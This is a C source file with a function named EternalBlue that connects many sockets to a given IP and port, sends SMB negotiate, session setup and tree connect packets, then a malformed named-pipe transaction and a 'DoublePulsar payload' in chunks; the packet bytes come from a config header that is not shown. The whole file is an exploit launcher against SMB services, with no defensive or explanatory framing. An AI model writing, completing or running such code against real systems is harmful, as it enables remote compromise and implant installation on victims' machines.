#define _GNU_SOURCE
#include "config.h"

#include <errno.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static int send_chunked(int fd, const void *data, size_t length, size_t chunk_size)
{
    const unsigned char *bytes = data;
    size_t offset = 0;

    if (chunk_size == 0) {
        return -1;
    }

    while (offset < length) {
        size_t amount = length - offset;
        size_t sent_offset = 0;

        if (amount > chunk_size) {
            amount = chunk_size;
        }

        while (sent_offset < amount) {
            ssize_t sent = send(fd, bytes + offset + sent_offset,
                                amount - sent_offset, MSG_NOSIGNAL);
            if (sent < 0) {
                if (errno == EINTR) {
                    continue;
                }
                return -1;
            }
            if (sent == 0) {
                return -1;
            }
            sent_offset += (size_t)sent;
        }

        offset += amount;
    }

    return 0;
}

int EternalBlue(const char *ip, int port)
{
    int sockets[NUM_SOCKETS];
    struct addrinfo hints;
    struct addrinfo *addresses = NULL;
    char service[32];
    size_t opened = 0;
    size_t i;
    int result = -1;

    for (i = 0; i < NUM_SOCKETS; ++i) {
        sockets[i] = -1;
    }

    if (ip == NULL) {
        printf("EternalBlue: invalid IP address\n");
        goto cleanup;
    }

    snprintf(service, sizeof(service), "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    printf("EternalBlue: resolving %s:%d\n", ip, port);
    if (getaddrinfo(ip, service, &hints, &addresses) != 0) {
        printf("EternalBlue: failed to resolve %s:%d\n", ip, port);
        goto cleanup;
    }

    for (i = 0; i < NUM_SOCKETS; ++i) {
        struct addrinfo *address;
        int connected = 0;

        printf("EternalBlue: opening socket %zu\n", i);
        for (address = addresses; address != NULL; address = address->ai_next) {
            int fd = socket(address->ai_family, address->ai_socktype,
                            address->ai_protocol);
            if (fd < 0) {
                continue;
            }
            if (connect(fd, address->ai_addr, address->ai_addrlen) == 0) {
                sockets[i] = fd;
                connected = 1;
                ++opened;
                break;
            }
            close(fd);
        }

        if (!connected) {
            printf("EternalBlue: failed to connect socket %zu\n", i);
            goto cleanup;
        }
    }

    freeaddrinfo(addresses);
    addresses = NULL;

    for (i = 0; i < NUM_SOCKETS; ++i) {
        printf("EternalBlue: sending negotiate packet on socket %zu\n", i);
        if (send_chunked(sockets[i], SMB_NEGOTIATE_PKT,
                         sizeof(SMB_NEGOTIATE_PKT), SMB_CHUNK_SIZE) < 0) {
            printf("EternalBlue: negotiate packet send failed on socket %zu\n", i);
            goto cleanup;
        }

        printf("EternalBlue: sending session setup packet on socket %zu\n", i);
        if (send_chunked(sockets[i], SMB_SESSION_SETUP_PKT,
                         sizeof(SMB_SESSION_SETUP_PKT), SMB_CHUNK_SIZE) < 0) {
            printf("EternalBlue: session setup send failed on socket %zu\n", i);
            goto cleanup;
        }

        printf("EternalBlue: sending tree connect packet on socket %zu\n", i);
        if (send_chunked(sockets[i], SMB_TREE_CONNECT_PKT,
                         sizeof(SMB_TREE_CONNECT_PKT), SMB_CHUNK_SIZE) < 0) {
            printf("EternalBlue: tree connect send failed on socket %zu\n", i);
            goto cleanup;
        }
    }

    printf("EternalBlue: sending malformed named-pipe transaction on socket 0 in chunks\n");
    if (send_chunked(sockets[0], SMB_TRANS_NAMED_PIPE_PKT,
                     sizeof(SMB_TRANS_NAMED_PIPE_PKT), SMB_CHUNK_SIZE) < 0) {
        printf("EternalBlue: malformed named-pipe transaction send failed\n");
        goto cleanup;
    }

    for (i = 2; i < NUM_SOCKETS; ++i) {
        printf("EternalBlue: sending DoublePulsar payload on socket %zu in chunks\n", i);
        if (send_chunked(sockets[i], DP_EXEC_PKT,
                         sizeof(DP_EXEC_PKT), SMB_CHUNK_SIZE) < 0) {
            printf("EternalBlue: DoublePulsar payload send failed on socket %zu\n", i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    if (addresses != NULL) {
        freeaddrinfo(addresses);
    }
    for (i = 0; i < opened; ++i) {
        if (sockets[i] >= 0) {
            printf("EternalBlue: closing socket %zu\n", i);
            close(sockets[i]);
            sockets[i] = -1;
        }
    }
    return result;
}